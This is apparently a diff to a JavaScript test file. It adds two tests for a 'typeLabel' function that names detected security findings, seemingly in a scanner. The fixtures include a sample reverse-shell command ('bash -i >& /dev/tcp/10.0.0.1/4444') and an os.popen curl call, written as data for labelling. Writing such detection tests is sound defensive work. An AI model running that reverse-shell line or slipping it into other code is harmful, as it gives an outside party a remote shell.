@@ -179,3 +179,21 @@ test("typeLabel: unknown type without attrName", () => {
   const result = typeLabel({ type: "something-new" });
   assert.strictEqual(result, "something-new");
 });
+
+test("typeLabel: code-execution", () => {
+  const result = typeLabel({
+    type: "code-execution",
+    match: 'os.popen("curl")',
+  });
+  assert.match(result, /Code-execution pattern/);
+  assert.match(result, /os\.popen/);
+});
+
+test("typeLabel: reverse-shell", () => {
+  const result = typeLabel({
+    type: "reverse-shell",
+    match: "bash -i >& /dev/tcp/10.0.0.1/4444",
+  });
+  assert.match(result, /Reverse-shell command/);
+  assert.match(result, /bash -i/);
+});
